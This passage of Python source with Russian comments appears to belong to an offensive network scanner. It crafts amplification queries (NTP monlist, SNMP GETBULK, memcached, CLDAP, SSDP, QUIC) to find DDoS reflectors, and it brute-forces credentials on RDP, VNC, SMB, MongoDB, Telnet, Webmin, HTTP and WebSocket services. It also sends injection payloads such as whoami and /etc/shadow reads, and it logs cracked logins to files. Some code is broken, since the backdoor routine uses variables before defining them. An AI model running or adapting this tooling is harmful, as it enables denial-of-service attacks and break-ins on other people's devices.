        """Валидация NTP ответа"""
        try:
            if len(response) < 4:
                return False
                
            # Проверяем что это NTP ответ
            first_byte = response[0]
            mode = first_byte & 0x07
            
            # Mode 6 (control) или 4 (server)
            return mode in [4, 6]
            
        except:
            return False

    def test_snmp_amplification(self, ip, port=161):
        """Тестирование SNMP amplification (5-50x) с GETBULK"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            
            # SNMP GETBULK запрос с public community
            snmp_getbulk = self.create_snmp_getbulk_query()
            sent_size = len(snmp_getbulk)
            
            sock.sendto(snmp_getbulk, (str(ip), port))
            response, addr = sock.recvfrom(65535)  # Большой буфер для SNMP
            received_size = len(response)
            
            sock.close()
            
            # Проверяем валидность SNMP ответа
            if self.validate_snmp_response(response):
                amp_factor = received_size / sent_size
                return AmplificationResult(
                    ip=ip, port=port, protocol="SNMP",
                    amplification_factor=amp_factor,
                    is_vulnerable=amp_factor >= 5.0
                )
                
        except Exception as e:
            pass
        
        return AmplificationResult(ip=ip, port=port, protocol="SNMP", amplification_factor=0, is_vulnerable=False)

    def create_snmp_getbulk_query(self):
        """Создает SNMP GETBULK запрос"""
        community = b'public'
        request_id = random.randint(1, 1000)
        
        # SNMPv2c GETBULK request
        snmp_packet = bytes([
            0x30, 0x26, 0x02, 0x01, 0x01,  # SNMP version 2c
            0x04, len(community)  # Community string length
        ]) + community + bytes([
            0xa5, 0x1a, 0x02, 0x01, request_id >> 8, request_id & 0xff,  # Request ID
            0x02, 0x01, 0x00,  # Non-repeaters
            0x02, 0x01, 0x0a,  # Max repetitions (10)
            0x30, 0x0e, 0x30, 0x0c, 0x06, 0x08, 
            # OID: 1.3.6.1.2.1.1 (system)
            0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x00,
            0x05, 0x00  # Null value
        ])
        
        return snmp_packet

    def validate_snmp_response(self, response):
        """Валидация SNMP ответа"""
        try:
            if len(response) < 10:
                return False
                
            # Проверяем что это SNMP packet (starts with 0x30)
            return response[0] == 0x30
            
        except:
            return False

    def test_ssdp_amplification(self, ip, port=1900):
        """Тестирование SSDP amplification"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            
            # SSDP M-SEARCH запрос
            ssdp_search = self.create_ssdp_discovery()
            sent_size = len(ssdp_search)
            
            # Отправляем на multicast или unicast
            sock.sendto(ssdp_search, (str(ip), port))
            response, addr = sock.recvfrom(4096)
            received_size = len(response)
            
            sock.close()
            
            # Проверяем валидность SSDP ответа
            if self.validate_ssdp_response(response):
                amp_factor = received_size / sent_size
                return AmplificationResult(
                    ip=ip, port=port, protocol="SSDP",
                    amplification_factor=amp_factor,
                    is_vulnerable=amp_factor >= 10.0
                )
                
        except Exception as e:
            pass
        
        return AmplificationResult(ip=ip, port=port, protocol="SSDP", amplification_factor=0, is_vulnerable=False)

    def validate_ssdp_response(self, response):
        """Валидация SSDP ответа"""
        try:
            response_str = response.decode('utf-8', errors='ignore')
            return "HTTP/1.1 200" in response_str or "NOTIFY" in response_str
        except:
            return False

    def test_quic_amplification(self, ip, port=443):
        """Тестирование QUIC amplification - ОБНОВЛЕННАЯ ВЕРСИЯ"""
        try:
            print(f"[QUIC] Тестирование {ip}:{port}")
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            
            # QUIC Initial packet
            quic_initial = self.create_quic_initial_packet()
            sent_size = len(quic_initial)
            
            print(f"[QUIC] Отправка {sent_size} байт на {ip}:{port}")
            start_time = time.time()
            sock.sendto(quic_initial, (str(ip), port))
            
            try:
                response, addr = sock.recvfrom(4096)
                received_size = len(response)
                response_time = time.time() - start_time
                
                sock.close()
                
                # Проверяем валидность QUIC ответа
                if self.validate_quic_response(response):
                    amp_factor = received_size / sent_size
                    print(f"[QUIC] Успех: {sent_size} -> {received_size} байт (x{amp_factor:.2f}) за {response_time:.2f}с")
                    
                    return AmplificationResult(
                        ip=ip, port=port, protocol="QUIC",
                        amplification_factor=amp_factor,
                        is_vulnerable=amp_factor >= 3.0  # QUIC обычно дает меньший коэффициент
                    )
                else:
                    print(f"[QUIC] Невалидный ответ от {ip}:{port}")
                    
            except socket.timeout:
                print(f"[QUIC] Таймаут для {ip}:{port}")
            except Exception as e:
                print(f"[QUIC] Ошибка получения ответа: {e}")
                    
        except Exception as e:
            print(f"[QUIC] Критическая ошибка: {e}")
        
        return AmplificationResult(ip=ip, port=port, protocol="QUIC", amplification_factor=0, is_vulnerable=False)

    def create_quic_initial_packet(self):
        """Создает QUIC Initial packet - УЛУЧШЕННАЯ ВЕРСИЯ"""
        try:
            # Более реалистичный QUIC Initial packet
            version = 0x00000001  # QUIC version 1
            dcid_len = 8
            scid_len = 8
            
            # Генерируем случайные Connection IDs
            import secrets
            dcid = secrets.token_bytes(dcid_len)
            scid = secrets.token_bytes(scid_len)
            
            packet = bytearray()
            
            # Header Byte
            packet.append(0xC0)  # Long header, Initial packet type
            
            # Version
            packet.extend(version.to_bytes(4, byteorder='big'))
            
            # Destination Connection ID Length + CID
            packet.append(dcid_len)
            packet.extend(dcid)
            
            # Source Connection ID Length + CID  
            packet.append(scid_len)
            packet.extend(scid)
            
            # Token Length (0)
            packet.extend(b'\x00\x00')
            
            # Length (минимизируем для amplification теста)
            length = 50  # Минимальная длина для QUIC
            packet.extend(length.to_bytes(2, byteorder='big'))
            
            # CRYPTO frame (минимальный)
            crypto_frame = bytearray()
            crypto_frame.append(0x06)  # CRYPTO frame type
            crypto_frame.extend((length - 2).to_bytes(2, byteorder='big'))  # Offset
            crypto_frame.extend(b'\x00')  # Minimal crypto data
            
            packet.extend(crypto_frame)
            
            print(f"[QUIC] Создан пакет размером {len(packet)} байт")
            return bytes(packet)
            
        except Exception as e:
            print(f"[QUIC] Ошибка создания пакета: {e}")
            # Fallback на базовый пакет
            return bytes([
                0x40, 0x00, 0x00, 0x01,  # Basic QUIC header
                0x00, 0x08, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,  # DCID
                0x00, 0x08, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,  # SCID
                0x00, 0x00,  # Token length
                0x00, 0x10,  # Length
                0x06, 0x00, 0x10, 0x00  # Minimal CRYPTO frame
            ])

    def validate_quic_response(self, response):
        """Валидация QUIC ответа - УЛУЧШЕННАЯ ВЕРСИЯ"""
        try:
            if len(response) < 5:
                print(f"[QUIC] Ответ слишком короткий: {len(response)} байт")
                return False
                
            # Проверяем что это QUIC packet (первый бит = 1 для long header)
            is_long_header = (response[0] & 0x80) == 0x80
            
            if is_long_header:
                print(f"[QUIC] Получен LONG HEADER ответ: {len(response)} байт")
                # Дополнительные проверки для long header
                if len(response) >= 7:
                    header_type = response[0] & 0x7F
                    print(f"[QUIC] Тип заголовка: {header_type:#04x}")
                    return header_type in [0x00, 0x01, 0x02, 0x03]  # Initial, 0-RTT, Handshake, Retry
            else:
                print(f"[QUIC] Получен SHORT HEADER ответ: {len(response)} байт")
                return True  # Short header всегда валиден для QUIC
                
            return is_long_header
            
        except Exception as e:
            print(f"[QUIC] Ошибка валидации: {e}")
            return False

    # Обновляем метод для создания протокольных запросов
    def create_protocol_specific_query(self, port):
        """Улучшенный метод создания запросов для всех протоколов - ОБНОВЛЕННЫЙ"""
        protocol_creators = {
            53: self.create_dns_amplification_query,
            1900: self.create_ssdp_discovery,
            3702: self.create_wsdiscovery_probe,
            11211: self.create_memcached_stats,
            389: self.create_cldap_search,
            5683: self.create_coap_discovery,
            443: self.create_quic_initial_packet,  # 🔥 ДОБАВЛЕНО
        }
        
        if port in protocol_creators:
            return protocol_creators[port]()
        return None

    def create_chargen_query(self):
        """Создает Chargen запрос"""
        return b"\x00"  # Любой байт для Chargen

    def create_qotd_query(self):
        """Создает QOTD запрос""" 
        return b"\x00"  # Любой байт для QOTD

    def create_tftp_query(self):
        """Создает TFTP read запрос"""
        return b"\x00\x01" + b"test.txt" + b"\x00" + b"octet" + b"\x00"

    def create_wsdiscovery_probe(self):
        """Создает WS-Discovery probe запрос"""
        return (
            '<?xml version="1.0" encoding="UTF-8"?>' +
            '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" ' +
            'xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" ' +
            'xmlns:tns="http://schemas.xmlsoap.org/ws/2005/04/discovery">' +
            '<soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To>' +
            '<wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action>' +
            '<wsa:MessageID>urn:uuid:' + str(random.randint(1000000, 9999999)) + '</wsa:MessageID>' +
            '</soap:Header><soap:Body><tns:Probe><tns:Types>tns:NetworkVideoTransmitter</tns:Types>' +
            '</tns:Probe></soap:Body></soap:Envelope>'
        ).encode()

    def validate_protocol_response(self, port, response):
        """Улучшенная валидация ответов для всех протоколов"""
        validators = {
            53: self.validate_dns_response,
            123: self.validate_ntp_response,
            1900: self.validate_ssdp_response,
            3702: self.validate_wsdiscovery_response,
            5353: self.validate_mdns_response,
            161: self.validate_snmp_response,
            11211: self.validate_memcached_response,
            389: self.validate_cldap_response,
            5683: self.validate_coap_response,
            443: self.validate_quic_response
        }
        
        if port in validators:
            return validators[port](response)
        
        # Общая проверка по умолчанию
        return len(response) >= 10

    def validate_wsdiscovery_response(self, response):
        """Валидация WS-Discovery ответа"""
        try:
            response_str = response.decode('utf-8', errors='ignore')
            return "soap:Envelope" in response_str and "ProbeMatches" in response_str
        except:
            return False

    def validate_memcached_response(self, response):
        """Валидация Memcached ответа"""
        return b'STAT' in response or b'END' in response or b'VALUE' in response

    def validate_cldap_response(self, response):
        """Валидация CLDAP ответа"""
        return len(response) > 20 and response[0] == 0x30  # LDAP sequence

    def validate_coap_response(self, response):
        """Валидация CoAP ответа"""
        return len(response) >= 4 and (response[0] & 0xE0) == 0x40  # CoAP version 1

    def create_dns_query(self, qname="google.com", qtype="A", qclass="IN"):
        """Исправленный DNS запрос - используем нормальные домены"""
        # DNS header
        transaction_id = random.randint(0, 65535)
        flags = 0x0100  # Standard query
        questions = 1
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0
        
        header = struct.pack('>HHHHHH', transaction_id, flags, questions, 
                            answer_rrs, authority_rrs, additional_rrs)
        
        # DNS question
        qname_parts = qname.split('.')
        qname_encoded = b''
        for part in qname_parts:
            qname_encoded += struct.pack('B', len(part)) + part.encode()
        qname_encoded += b'\x00'  # End of QNAME
        
        # QTYPE and QCLASS
        qtype_val = 1 if qtype == "A" else 16  # A record or TXT
        qclass_val = 1  # IN class (стандартный)
        
        question = qname_encoded + struct.pack('>HH', qtype_val, qclass_val)
        
        return header + question

    def create_memcached_stats(self):
        """Создает Memcached stats запрос"""
        return b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"

    def create_cldap_search(self):
        """Создает CLDAP search запрос"""
        return bytes([
            0x30, 0x25, 0x02, 0x01, 0x01, 0x63, 0x20, 0x04, 0x00, 
            0x0a, 0x01, 0x00, 0x0a, 0x01, 0x00, 0x02, 0x01, 0x00, 
            0x02, 0x01, 0x00, 0x01, 0x01, 0x00, 0x87, 0x0b, 0x6f, 
            0x62, 0x6a, 0x65, 0x63, 0x74, 0x63, 0x6c, 0x61, 0x73, 
            0x73, 0x30, 0x00
        ])

    def create_mqtt_sn_search(self):
        """Создает MQTT-SN SEARCHGW запрос"""
        return bytes([
            0x01, 0x02, 0x00, 0x00, 0x01  # SEARCHGW with radius=1
        ])

    def create_mdns_query(self):
        """Создает mDNS query запрос"""
        transaction_id = random.randint(0, 65535)
        flags = 0x0000  # Standard query
        questions = 1
        answers = 0
        authority_rrs = 0
        additional_rrs = 0
        
        header = struct.pack('>HHHHHH', transaction_id, flags, questions, 
                            answers, authority_rrs, additional_rrs)
        
        # Query for _services._dns-sd._udp.local
        qname = b'\x09_services\x07_dns-sd\x04_udp\x05local\x00'
        qtype = 12  # PTR
        qclass = 0x8001  # CLASS IN with unicast response
        
        question = qname + struct.pack('>HH', qtype, qclass)
        
        return header + question

    def create_ntp_monlist(self):
        """Создает NTP MON_GETLIST запрос"""
        return bytes([
            0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        ])

    def create_snmp_getbulk(self):
        """Создает SNMP GETBULK запрос"""
        community = b'public'
        request_id = random.randint(1, 1000)
        
        snmp_packet = bytes([
            0x30, 0x26, 0x02, 0x01, 0x01,  # SNMP version 1
            0x04, len(community)  # Community string
        ]) + community + bytes([
            0xa5, 0x1a, 0x02, 0x01, request_id >> 8, request_id & 0xff,  # Request ID
            0x02, 0x01, 0x00,  # Non-repeaters
            0x02, 0x01, 0x0a,  # Max repetitions
            0x30, 0x0e, 0x30, 0x0c, 0x06, 0x08, 0x2b, 0x06, 
            0x01, 0x02, 0x01, 0x01, 0x01, 0x00, 0x05, 0x00
        ])
        
        return snmp_packet

    def create_quic_handshake(self):
        """Создает QUIC handshake инициирование"""
        return bytes([
            0x0d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00,
            0x40, 0x00, 0x00, 0x00, 0x00
        ])


    def create_coap_discovery(self):
        """Создает валидный CoAP discovery запрос"""
        return bytes([
            0x40, 0x01, 0x00, 0x00,  # Ver=1, T=CON, GET
            0x00, 0x01,              # Message ID
            0x00,                    # Token length
            # URI-Path: .well-known/core
            0xBD, 0x0B, 0x2E, 0x77, 0x65, 0x6C, 0x6C, 0x2D, 0x6B, 0x6E, 0x6F, 0x77, 0x6E,
            0xBD, 0x04, 0x63, 0x6F, 0x72, 0x65
        ])

    def create_ssdp_discovery(self):
        """Создает валидный SSDP discovery"""
        return (
            "M-SEARCH * HTTP/1.1\r\n"
            "Host: 239.255.255.250:1900\r\n"
            "Man: \"ssdp:discover\"\r\n"
            "MX: 3\r\n"
            "ST: ssdp:all\r\n"
            "\r\n"
        ).encode()

    def create_bacnet_whois(self):
        """Создает BACnet Who-Is запрос"""
        return bytes([
            0x81, 0x0a, 0x00, 0x0c, 0x01, 0x20, 0xff, 0xff, 0x00, 0xff, 0x00, 0xff
        ])

    def test_amplification_factor(self, ip, port, protocol_name):
        """УЛУЧШЕННАЯ проверка amplification factor"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            
            # 🔥 ОПТИМАЛЬНЫЕ запросы для каждого протокола
            query = self.create_optimized_amplification_query(port, protocol_name)
            if not query:
                return None
                
            sent_size = len(query)
            
            # Отправляем запрос
            start_time = time.time()
            sock.sendto(query, (str(ip), port))
            
            try:
                # 🔥 УВЕЛИЧИВАЕМ буфер для больших ответов
                response, addr = sock.recvfrom(8192)  # Увеличили до 8KB
                received_size = len(response)
                response_time = time.time() - start_time
                
                # 🔥 СТРОГАЯ валидация ответа
                if not self.validate_amplification_response(port, response):
                    return None
                
                # 🔥 УСИЛЕННЫЕ критерии уязвимости
                MIN_RESPONSE_SIZE = 50   # Минимальный размер ответа
                MIN_AMPLIFICATION = 1.25  # Минимальный коэффициент
                MAX_RESPONSE_TIME = 5.0  # Максимальное время ответа
                
                if (received_size >= MIN_RESPONSE_SIZE and 
                    response_time <= MAX_RESPONSE_TIME):
                    
                    amp_factor = received_size / sent_size
                    
                    return {
                        'amp_factor': amp_factor,
                        'request_size': sent_size,
                        'response_size': received_size,
                        'response_time': response_time,
                        'is_vulnerable': amp_factor >= MIN_AMPLIFICATION,
                        'protocol': protocol_name,
                        'ip': ip,
                        'port': port
                    }
                    
            except socket.timeout:
                return None
            finally:
                sock.close()
                
        except Exception as e:
            return None

    def validate_amplification_response(self, port, response):
        """УСИЛЕННАЯ валидация amplification ответов"""
        if len(response) < 10:  # Минимальный размер ответа
            return False
            
        try:
            if port == 53:  # DNS
                # Проверяем что это DNS ответ (QR bit = 1)
                return len(response) >= 12 and (response[2] & 0x80) == 0x80
                
            elif port == 123:  # NTP
                return len(response) >= 48  # Минимальный NTP пакет
                
            elif port == 1900:  # SSDP
                return b'HTTP/1.1' in response or b'NOTIFY' in response
                
            elif port == 11211:  # Memcached
                return b'STAT' in response or b'END' in response
                
            elif port == 389:  # CLDAP
                return len(response) > 20 and response[0] == 0x30  # LDAP sequence
                
            elif port == 5683:  # CoAP
                return len(response) >= 4 and (response[0] & 0xE0) == 0x40  # CoAP version 1
                
            elif port == 161:  # SNMP
                return len(response) > 20 and response[0] == 0x30  # ASN.1 sequence
                
            elif port == 19:  # Chargen
                return len(response) > 50  # Chargen генерирует много данных
                
            elif port == 17:  # QOTD
                return len(response) > 20  # QOTD возвращает цитату
                
            elif port == 443:  # QUIC
                return len(response) >= 20  # Минимальный QUIC ответ
                
        except Exception:
            return False
            
        return True

    def save_unified_results(self, results):
        """Сохраняет все результаты в едином формате"""
        for result in results:
            if result['type'] == 'amplification' and result.get('amp_factor', 0) >= 2.0:
                line = f"{result['ip']}:{result['port']}:{result['service']}:{result['amp_factor']:.2f}x\n"
                with open('unified_results.txt', 'a') as f:
                    f.write(line)
            elif result['type'] == 'iot':
                line = f"{result['ip']}:{result['port']}:{result['credentials']}:{result['service']}\n"
                with open('unified_results.txt', 'a') as f:
                    f.write(line)

    def brute_force_mongodb(self, ip, port):
        try:
            from pymongo import MongoClient
            for login, password in self.credentials:
                try:
                    client = MongoClient(f"mongodb://{login}:{password}@{ip}:{port}/", 
                                       serverSelectionTimeoutMS=5000)
                    client.admin.command('ismaster')
                    return True, login, password
                except:
                    continue
        except ImportError:
            return self.brute_force_generic(ip, port)

    def brute_force_rdp(self, ip, port):
        """Специализированный RDP брутфорс"""
        try:
            import subprocess
            # Использование rdesktop или xfreerdp
            for login, password in self.credentials:
                cmd = [
                    "xfreerdp", f"/v:{ip}:{port}",
                    f"/u:{login}", f"/p:{password}",
                    "/cert-ignore", "+auth-only"
                ]
                result = subprocess.run(cmd, capture_output=True, timeout=10)
                if result.returncode == 0:
                    return True, login, password
        except:
            return self.brute_force_generic(ip, port)

    def brute_force_vnc(self, ip, port):
        """Специализированный VNC брутфорс"""
        try:
            for login, password in self.credentials:
                # VNC обычно без логина, только пароль
                try:
                    import vncdotool
                    with vncdotool.api.connect(f"{ip}:{port}", password=password) as client:
                        return True, "", password
                except:
                    continue
        except ImportError:
            return self.brute_force_generic(ip, port)

    def brute_force_http(self, ip, port):
        """Брутфорс HTTP сервисов + WebSocket"""
        schemes = ['http', 'https'] if port == "443" else ['http']
        
        # Сначала проверяем обычный HTTP брутфорс
        for scheme in schemes:
            for login, password in self.credentials:
                try:
                    url = f"{scheme}://{ip}:{port}"
                    response = requests.get(
                        url,
                        auth=HTTPBasicAuth(login, password),
                        timeout=10,
                        verify=False
                    )
                    if response.status_code == 200:
                        return True, login, password
                except:
                    continue
        
        # Если HTTP брутфорс не сработал, проверяем WebSocket
        ws_result = self.brute_force_websocket(ip, port)
        if ws_result[0]:
            return ws_result
        
        return False, "", ""

    def brute_force_websocket(self, ip, port):
        """Брутфорс WebSocket endpoints"""
        # WebSocket endpoints для проверки
        ws_endpoints = [
            "/ws", "/websocket", "/socket", "/wss", 
            "/api/ws", "/api/websocket", "/live", "/stream",
            "/chat", "/realtime", "/events", "/updates"
        ]
        
        # Определяем схему (ws или wss)
        schemes = ['wss', 'ws'] if port in [443, 8443] else ['ws']
        
        for scheme in schemes:
            for endpoint in ws_endpoints:
                for login, password in self.credentials:
                    try:
                        url = f"{scheme}://{ip}:{port}{endpoint}"
                        
                        # Создаем WebSocket соединение
                        ws = websocket.WebSocket()
                        ws.settimeout(8)
                        
                        # Пробуем подключиться с credentials
                        headers = {
                            'Authorization': 'Basic ' + base64.b64encode(f"{login}:{password}".encode()).decode(),
                            'User-Agent': 'IoT-Scanner',
                            'Origin': f"{scheme}://{ip}"
                        }
                        
                        ws.connect(url, header=headers, timeout=8)
                        
                        if ws.connected:
                            # Проверяем, что соединение действительно работает
                            test_msg = json.dumps({"action": "ping"})
                            ws.send(test_msg)
                            
                            try:
                                response = ws.recv()
                                # Если получили ответ - соединение рабочее
                                ws.close()
                                return True, login, password
                            except:
                                # Даже если нет ответа, но соединение установлено - считаем успехом
                                ws.close()
                                return True, login, password
                                
                    except websocket.WebSocketBadStatusException as e:
                        # 401 Unauthorized - неправильные credentials
                        continue
                    except websocket.WebSocketTimeoutException:
                        continue
                    except Exception as e:
                        continue
        
        # Пробуем без аутентификации
        for scheme in schemes:
            for endpoint in ws_endpoints:
                try:
                    url = f"{scheme}://{ip}:{port}{endpoint}"
                    ws = websocket.WebSocket()
                    ws.settimeout(5)
                    
                    ws.connect(url, timeout=5)
                    
                    if ws.connected:
                        # WebSocket доступен без аутентификации
                        ws.close()
                        return True, "no_auth", "no_auth"
                        
                except:
                    continue
        
        return False, "", ""

    def check_websocket_vulnerabilities(self, ip, port):
        """Проверка уязвимостей WebSocket"""
        vulnerabilities = []
        
        # Endpoints для проверки
        endpoints = ["/ws", "/websocket", "/api/ws", "/live", "/stream", "/chat"]
        schemes = ['wss', 'ws'] if port in [443, 8443] else ['ws']
        
        for scheme in schemes:
            for endpoint in endpoints:
                try:
                    url = f"{scheme}://{ip}:{port}{endpoint}"
                    ws = websocket.create_connection(url, timeout=5)
                    
                    if ws.connected:
                        vulnerabilities.append(f"WebSocket No-Auth: {url}")
                        
                        # Тестируем базовые уязвимости
                        test_payloads = [
                            '{"action":"ping"}',
                            '{"command":"status"}',
                            '{"request":"info"}'
                        ]
                        
                        for payload in test_payloads:
                            try:
                                ws.send(payload)
                                response = ws.recv()
                                if response:
                                    vulnerabilities.append(f"WebSocket Response: {payload} -> {response[:100]}")
                            except:
                                continue
                        
                        ws.close()
                        break
                        
                except Exception as e:
                    if "401" not in str(e) and "403" not in str(e):
                        continue
        
        return vulnerabilities

    def test_websocket_injections(self, ws, url):
        """Тестирование инъекционных уязвимостей WebSocket"""
        vulnerabilities = []
        
        injection_payloads = [
            # Command injection
            '{"action":"exec","command":"whoami"}',
            '{"action":"system","cmd":"id"}',
            
            # SQL injection  
            '{"action":"query","sql":"SELECT * FROM users"}',
            '{"action":"db","query":"SHOW TABLES"}',
            
            # Code injection
            '{"action":"eval","code":"require(\"child_process\").exec(\"ls\")"}',
            '{"action":"run","script":"print(\\\"test\\\")"}',
            
            # Path traversal
            '{"action":"read","file":"/etc/passwd"}',
            '{"action":"load","path":"../../etc/shadow"}'
        ]
        
        for payload in injection_payloads:
            try:
                ws.send(payload)
                response = ws.recv()
                
                # Проверяем признаки успешной инъекции
                success_indicators = [
                    "root", "admin", "uid=", "gid=",
                    "mysql", "user", "password", "secret",
                    "bin/bash", "/home/", "etc/passwd"
                ]
                
                if any(indicator in response.lower() for indicator in success_indicators):
                    vulnerabilities.append(f"Injection Vulnerability: {payload}")
                    
            except:
                continue
        
        return vulnerabilities

    def test_websocket_data_leakage(self, ws):
        """Тестирование утечки данных через WebSocket"""
        vulnerabilities = []
        
        data_queries = [
            '{"action":"getUsers"}',
            '{"action":"getConfig"}', 
            '{"action":"getSettings"}',
            '{"action":"listFiles"}',
            '{"action":"systemInfo"}',
            '{"action":"networkConfig"}',
            '{"action":"databaseDump"}'
        ]
        
        for query in data_queries:
            try:
                ws.send(query)
                response = ws.recv()
                
                # Проверяем наличие чувствительных данных
                sensitive_patterns = [
                    "password", "secret", "key", "token",
                    "admin", "user", "credential", "config",
                    "private", "ssh", "rsa", "dsa"
                ]
                
                if any(pattern in response.lower() for pattern in sensitive_patterns):
                    vulnerabilities.append(f"Data Leakage: {query}")
                    
            except:
                continue
        
        return vulnerabilities

    def scan_websocket_services(self, ip):
        """Сканирование WebSocket сервисов для IP"""
        websocket_ports = ["80", "443", "8080", "7547", "8088", "8888", "8443", "8000", "81", "82", "83", "84", "85", "86", "88", "8008", "8081", "8082", "8090", "8181", "8444", "8843", "9001", "3000", "5000",]
        results = []
        
        for port_str in websocket_ports:
            port = int(port_str)
            
            # Проверяем доступность порта
            if not self.check_port(ip, port):
                continue
                
            # Проверяем WebSocket endpoints
            ws_vulnerabilities = self.check_websocket_vulnerabilities(ip, port)
            
            if ws_vulnerabilities:
                result = {
                    'ip': ip,
                    'port': port,
                    'service': 'WebSocket Service',
                    'vulnerabilities': ws_vulnerabilities,
                    'type': 'websocket'
                }
                results.append(result)
                
                # Сохраняем в файл
                with open('websocket_results.txt', 'a') as f:
                    f.write(f"{ip}:{port}:{ws_vulnerabilities}\n")
        
        return results

    async def async_telnet_login(self, ip, port, login, password, timeout=10):
        """Асинхронный Telnet брутфорс с telnetlib3"""
        try:
            reader, writer = await asyncio.wait_for(
                telnetlib3.open_connection(ip, port),
                timeout=timeout
            )
            
            # Ждем приглашение логина
            output = await asyncio.wait_for(reader.read(1024), timeout=10)
            
            # Отправляем логин
            writer.write(login + "\r\n")
            await writer.drain()
            
            # Ждем приглашение пароля
            output = await asyncio.wait_for(reader.read(1024), timeout=10)
            
            # Отправляем пароль
            writer.write(password + "\r\n")
            await writer.drain()
            
            # Проверяем результат
            output = await asyncio.wait_for(reader.read(1024), timeout=10)
            
            writer.close()
            await writer.wait_closed()
            
            # Проверяем успешность входа
            success_indicators = ["#", "$", ">", "welcome", "success", "last login"]
            failure_indicators = ["login incorrect", "fail", "error", "denied"]
            
            if any(indicator in output.lower() for indicator in success_indicators):
                if not any(indicator in output.lower() for indicator in failure_indicators):
                    return True
                    
        except Exception as e:
            return False
        
        return False

    def brute_force_ubiquiti(self, ip, port):
        """Брутфорс Ubiquiti устройств"""
        # Ubiquiti обычно использует HTTP basic auth
        return self.brute_force_http(ip, port)

    def brute_force_upnp_enhanced(self, ip, port):
        """Расширенный брутфорс UPnP"""
        try:
            # Пробуем SOAP запросы для UPnP
            soap_body = """
            <?xml version="1.0"?>
            <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" 
                       s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                <s:Body>
                    <u:GetExternalIPAddress xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"/>
                </s:Body>
            </s:Envelope>
            """
            
            headers = {
                'Content-Type': 'text/xml; charset="utf-8"',
                'SOAPAction': '"urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress"'
            }
            
            response = requests.post(
                f"http://{ip}:{port}/ctl/IPConn",
                data=soap_body,
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200 and "<NewExternalIPAddress>" in response.text:
                return True, "upnp", "no_auth"
                
        except:
            pass
        
        # Fallback на обычный HTTP
        return self.brute_force_http(ip, port)

    def brute_force_webmin(self, ip, port):
        """Брутфорс Webmin"""
        # Webmin использует собственный формат аутентификации
        for login, password in self.credentials:
            try:
                session = requests.Session()
                
                # Получаем страницу логина
                login_url = f"https://{ip}:{port}/session_login.cgi" if port == 10443 else f"http://{ip}:{port}/session_login.cgi"
                
                # Получаем cookies и токен
                response = session.get(login_url, verify=False, timeout=10)
                
                # Пробуем войти
                login_data = {
                    'user': login,
                    'pass': password,
                    'save': '1'
                }
                
                response = session.post(login_url, data=login_data, verify=False, timeout=10)
                
                if 'session_login.cgi' not in response.url and response.status_code == 200:
                    return True, login, password
                    
            except:
                continue
        
        return False, "", ""

    def brute_force_smb(self, ip, port):
        """Брутфорс SMB shares"""
        try:
            import smbclient
            for login, password in self.credentials:
                try:
                    # Пробуем анонимный доступ
                    if login == "" and password == "":
                        shares = smbclient.list_shares(f"\\\\{ip}")
                        if shares:
                            return True, "anonymous", ""
                    
                    # Пробуем с учетными данными
                    with smbclient.SmbSession(ip, username=login, password=password):
                        shares = smbclient.list_shares(f"\\\\{ip}")
                        if shares:
                            return True, login, password
                except:
                    continue
        except ImportError:
            # Fallback на generic метод
            return self.brute_force_generic(ip, port)
        
        return False, "", ""

    def brute_force_backdoor_enhanced(self, ip, port):
        """Расширенный брутфорс бэкдоров"""
        backdoor_payloads = [
            # Стандартные форматы
            f"LOGIN {login} {password}\n",
            f"AUTH {login} {password}\n", 
            f"USER {login}\nPASS {password}\n",
            f"admin\n{password}\n",
            f"root\n{password}\n",
            
            # Hex encoded
            f"{login}:{password}".encode().hex() + "\n",
            
            # Base64 encoded
            base64.b64encode(f"{login}:{password}".encode()).decode() + "\n",
            
            # Backdoor specific
            f"shell\n{login}\n{password}\n",
            f"enable\n{password}\n",
            f"system\n{login}\n{password}\n",
        ]
        
        for login, password in self.credentials:
            for payload in backdoor_payloads:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((str(ip), int(port)))
                    
                    # Получаем баннер
                    banner = sock.recv(1024).decode('utf-8', errors='ignore')
                    
                    # Отправляем полезную нагрузку
                    if isinstance(payload, str):
                        sock.send(payload.encode())
                    else:
                        sock.send(payload)
                    
                    # Ждем ответ
                    response = sock.recv(1024).decode('utf-8', errors='ignore')
                    sock.close()
                    
                    # Проверяем индикаторы успеха
                    success_indicators = ["success", "welcome", "connected", "logged in", "#", "$", ">"]
                    failure_indicators = ["fail", "error", "denied", "invalid", "incorrect"]
                    
                    if any(indicator in response.lower() for indicator in success_indicators):
                        if not any(indicator in response.lower() for indicator in failure_indicators):
                            return True, login, password
                            
                except:
                    continue
        
        return False, "", ""

